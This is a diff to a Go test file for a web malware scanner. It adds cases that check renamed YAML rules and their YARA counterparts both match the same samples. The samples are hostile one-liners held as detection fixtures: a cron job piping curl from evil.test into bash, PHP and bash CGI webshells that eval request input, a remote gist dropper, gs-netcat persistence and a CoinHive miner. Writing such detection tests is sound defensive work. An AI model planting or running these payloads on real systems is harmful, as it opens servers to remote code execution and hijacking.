@@ -3,8 +3,11 @@
 package yara_test
 
 import (
+	"os"
 	"path/filepath"
+	"regexp"
 	"runtime"
+	"sort"
 	"strings"
 	"testing"
 
@@ -1394,9 +1397,119 @@ move_uploaded_file($_FILES['image']['tmp_name'], '/uploads/image.jpg');`,
 			wantYAMLHit: true,
 			wantYARAHit: false,
 		},
+		{
+			name:        "cron reverse shell rename",
+			yamlRule:    "backdoor_cron_reverse_shell",
+			yaraRule:    "backdoor_cron_downloader",
+			ext:         ".sh",
+			sample:      "*/5 * * * * curl -s http://evil.test/p.sh | bash\n",
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:        "must-use plugin loader rename",
+			yamlRule:    "backdoor_wp_muplugin_loader",
+			yaraRule:    "backdoor_wp_muplugin",
+			ext:         ".php",
+			sample:      `<?php @include(ABSPATH . 'wp-content/mu-plugins/' . base64_decode('c2hlbGwucGhw'));`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:     "bash CGI webshell rename",
+			yamlRule: "cgi_bash_webshell",
+			yaraRule: "cgi_webshell_bash",
+			ext:      ".cgi",
+			sample: "#!/bin/bash\n" +
+				"echo \"Content-type: text/html\"\n" +
+				"echo \"\"\n" +
+				"eval \"$(echo $QUERY_STRING | base64 -d)\"\n",
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:     "xmlrpc multicall rename",
+			yamlRule: "exploit_wp_xmlrpc",
+			yaraRule: "exploit_wp_xmlrpc_abuse",
+			ext:      ".php",
+			sample: `<?php
+$body = '<methodName>system.multicall</methodName>';
+$r = wp_remote_post('https://target.test/xmlrpc.php', array('body' => $body));`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:        "gsocket persistence rename",
+			yamlRule:    "gsocket_persistence",
+			yaraRule:    "gsocket_cron_persistence",
+			ext:         ".sh",
+			sample:      "# SEED PRNG\nexec -a defunct-kernel /usr/bin/gs-netcat -k /tmp/.k -il\n",
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:        "CoinHive rename",
+			yamlRule:    "miner_coinhive_js",
+			yaraRule:    "miner_coinhive",
+			ext:         ".js",
+			sample:      "var miner = new CoinHive.Anonymous('sitekey');\nminer.start();\n",
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:        "assert decoder rename",
+			yamlRule:    "obfuscation_assert_string",
+			yaraRule:    "obfuscation_assert_exec",
+			ext:         ".php",
+			sample:      `<?php assert(base64_decode($_POST['x']));`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:        "gist dropper rename",
+			yamlRule:    "php_dropper_gist",
+			yaraRule:    "php_dropper_github_gist",
+			ext:         ".php",
+			sample:      `<?php eval(file_get_contents('https://gist.githubusercontent.com/a/b/raw/p.txt'));`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:        "open_basedir reset rename",
+			yamlRule:    "php_open_basedir_override",
+			yaraRule:    "exploit_open_basedir_escape",
+			ext:         ".php",
+			sample:      `<?php ini_set("open_basedir", "/");`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:     "LiteSpeed disguise rename",
+			yamlRule: "webshell_litespeed_backdoor",
+			yaraRule: "webshell_litespeed_disguise",
+			ext:      ".php",
+			sample: `<?php
+/* litespeed cache helper */
+eval($_POST['c']);`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:        "core file modification rename",
+			yamlRule:    "wp_core_file_modify",
+			yaraRule:    "exploit_wp_core_modification",
+			ext:         ".php",
+			sample:      `<?php file_put_contents(ABSPATH . 'wp-includes/class-wp-hook.php', $payload);`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
 	}
 
+	proven := make(map[string]string)
 	for _, tc := range tests {
+		if tc.wantYAMLHit && tc.wantYARAHit {
+			proven[tc.yamlRule] = tc.yaraRule
+		}
 		t.Run(tc.name, func(t *testing.T) {
 			yamlHit := hasSignatureRule(yamlScanner.ScanContent([]byte(tc.sample), tc.ext), tc.yamlRule)
 			yaraHit := hasRepositoryYaraRule(yaraScanner.ScanBytes([]byte(tc.sample)), tc.yaraRule)
@@ -1408,6 +1521,53 @@ move_uploaded_file($_FILES['image']['tmp_name'], '/uploads/image.jpg');`,
 			}
 		})
 	}
+
+	// An alias asserts that the scheduled-scan path still catches what the
+	// realtime-only rule catches. Requiring a positive claim here is what turns
+	// that assertion into evidence: shared literals are not shared behaviour,
+	// and a covering rule can match a sample only because the sample carried an
+	// unrelated signal. An alias added without a sample that fires both rules
+	// fails this test.
+	var unproven []string
+	for yamlRule, yaraRule := range parseRenamedYARARules(t) {
+		if proven[yamlRule] != yaraRule {
+			unproven = append(unproven, yamlRule+" -> "+yaraRule)
+		}
+	}
+	sort.Strings(unproven)
+	if len(unproven) > 0 {
+		t.Errorf("%d renamed rules have no claim sample firing both the YAML rule and its YARA counterpart: %v", len(unproven), unproven)
+	}
+}
+
+// parseRenamedYARARules reads the alias map out of the signatures parity test.
+// The map is test-only state in another package, so it cannot be imported;
+// reading the declaration is what keeps the claims here from drifting away
+// from the aliases they are supposed to prove.
+func parseRenamedYARARules(t *testing.T) map[string]string {
+	t.Helper()
+
+	_, thisFile, _, ok := runtime.Caller(0)
+	if !ok {
+		t.Fatal("runtime.Caller failed")
+	}
+	path := filepath.Join(filepath.Dir(thisFile), "..", "signatures", "rule_parity_test.go")
+	source, err := os.ReadFile(path) // #nosec G304 -- fixed sibling test source
+	if err != nil {
+		t.Fatalf("reading %s: %v", path, err)
+	}
+	block := regexp.MustCompile(`(?s)var renamedYARARules = map\[string\]string\{(.*?)\n\}`).FindSubmatch(source)
+	if block == nil {
+		t.Fatalf("renamedYARARules declaration not found in %s", path)
+	}
+	aliases := make(map[string]string)
+	for _, match := range regexp.MustCompile(`"([A-Za-z0-9_]+)":\s*"([A-Za-z0-9_]+)"`).FindAllSubmatch(block[1], -1) {
+		aliases[string(match[1])] = string(match[2])
+	}
+	if len(aliases) == 0 {
+		t.Fatalf("no aliases parsed from %s", path)
+	}
+	return aliases
 }
 
 func hasSignatureRule(matches []signatures.Match, name string) bool {
